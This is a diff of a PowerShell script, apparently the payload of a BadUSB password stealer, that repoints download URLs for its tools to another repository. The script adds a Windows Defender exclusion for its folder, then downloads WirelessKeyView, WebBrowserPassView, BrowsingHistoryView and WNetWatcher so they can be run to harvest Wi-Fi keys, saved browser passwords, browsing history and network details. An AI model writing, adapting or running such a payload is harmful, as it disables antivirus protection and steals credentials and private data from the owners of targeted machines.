@@ -16,10 +16,10 @@ New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
 Add-MpPreference -ExclusionPath $basePath -Force
 
 # Download necessary tools
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
+Invoke-WebRequest https://github.com/val-alaval-TOUT/attiny/blob/117c7df5b139e494348346e5a0ddb77cd9e8d213/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
+Invoke-WebRequest https://github.com/val-alaval-TOUT/attiny/blob/117c7df5b139e494348346e5a0ddb77cd9e8d213/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
+Invoke-WebRequest https://github.com/val-alaval-TOUT/attiny/blob/117c7df5b139e494348346e5a0ddb77cd9e8d213/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
+Invoke-WebRequest https://github.com/val-alaval-TOUT/attiny/blob/117c7df5b139e494348346e5a0ddb77cd9e8d213/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
 
 
 # Execute tools to gather data
